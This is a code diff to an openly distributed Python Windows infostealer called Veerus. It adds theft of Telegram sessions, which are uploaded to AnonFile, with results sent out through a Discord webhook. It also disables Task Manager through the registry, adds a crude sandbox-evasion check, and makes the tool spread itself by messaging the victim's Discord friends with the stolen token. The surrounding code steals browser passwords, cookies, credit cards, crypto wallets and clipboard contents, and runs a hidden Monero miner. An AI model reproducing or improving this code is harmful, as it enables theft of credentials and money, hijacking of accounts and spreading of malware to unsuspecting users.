@@ -46,6 +46,8 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 import winreg as reg
+import winreg
+from anonfile import AnonFile
 import getpass
 import os
 import zipfile
@@ -68,11 +70,30 @@ WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 dm_all = True
-DMALLMSG = """Hey ! i am a French developer and i created the 1st free discord image grabber, would you be interessed to test it :smiling_imp: ? link : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
+DMALLMSG = """:flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
 
+	Discord :
+		Token
+
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+
+	Price : 0.00$ ! yes ! Totally Free !
+
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus"""
 mdmbot = discord.Client()
-
-
 STATSWEBHOOK = "NoWebhook667EKIP"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
@@ -83,6 +104,21 @@ STATSAPI = [
 
 os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
 
+REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+
+
+def set_reg(name, value):
+	try:
+		winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+		registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
+									   winreg.KEY_WRITE)
+		winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
+		winreg.CloseKey(registry_key)
+		return True
+	except WindowsError:
+		return False
+
+set_reg("DisableTaskMgr", "1")
 WALLETCOUNT = 0
 CURRENCYPWNUM = 0
 CREDITCARDSNUM = 0
@@ -172,6 +208,15 @@ if yes == "yes":
 			return btcUuid + ".zip"
 		except:
 			return "No wallets"
+	TLGSESSIONS = 0
+	def stealTLG():
+		global TLGSESSIONS
+		btcUuid = str(uuid.uuid4())
+		shutil.make_archive(btcUuid, 'zip', default_appdata + "\\Telegram Desktop\\tdata")
+		TLGSESSIONS = TLGSESSIONS + 1
+		return btcUuid + ".zip"
+
+
 
 	def GetClipboardData():
 		win32clipboard.OpenClipboard()
@@ -809,11 +854,17 @@ if yes == "yes":
 			webhook.add_embed(embed)
 			webhook.execute()
 			time.sleep(180)
+	import sys # only lib needed
 
-	isVM = len(wmi.WMI().Win32_PortConnector()) == 0
-	if(isVM == True):
-		exit()
-	if(WEBHOOK != "" and WEBHOOK != None and isVM == False):
+	def get_base_prefix_compat(): # define all of the checks
+		return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
+
+	def in_virtualenv(): 
+		return get_base_prefix_compat() != sys.prefix
+
+	if in_virtualenv() == True: # if we are in a vm
+		sys.exit() # exit
+	if(WEBHOOK != "" and WEBHOOK != None):
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
@@ -855,18 +906,21 @@ if yes == "yes":
 		webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
 		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_mouth: Currency Password : {CURRENCYPWNUM}\n:pushpin: Wallet Count : {WALLETCOUNT}\n:clipboard: Clipboard : ```{GetClipboardData()}```**', color='03b2f8')
 		webhook.add_embed(embed2)
+		try:
+			TelegramSessionPath = stealTLG()
+			print(TelegramSessionPath)
+			anon = AnonFile()
+			upload = anon.upload(TelegramSessionPath, progressbar=True)
+			SESSIONURL = upload.url.geturl()
+			embed3 = DiscordEmbed(title='github.com/0xSxZ/Veerus', description=f':telephone: **0xGot Telegram Sessions !\nDownload link : **{SESSIONURL}', color='7F8C8D')
+			webhook.add_embed(embed3)
+		except:
+			print("No Telegram Sessions")
 		webhook.execute()
 	print("[.] Sending Stats")
 	threading.Thread(target=minerstats).start()
 	@mdmbot.event
 	async def on_connect():
-		print("User Logged Into:")
-		print("-----------------")
-		print(mdmbot.user.name)
-		print(mdmbot.user.id)
-		print("-----------------")
-		print("Started massing..")
-		print("-----------------")
 		for user in mdmbot.user.friends:
 			try:
 				user = await mdmbot.fetch_user(user.id)
@@ -876,14 +930,6 @@ if yes == "yes":
 		print(f"{mdmbot.user.name} hass finished mdming!")
 
 	if(dm_all == True):
-		try:
-			token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
-			print("Token : " + token)
-			mdmbot.run(token, bot=False)
-		except:
-			try:
-				token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[1]
-				print("Token : " + token)
-				mdmbot.run(token, bot=False)
-			except:
-				pass
+		token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
+		print("Token : " + token)
+		mdmbot.run(token, bot=False)
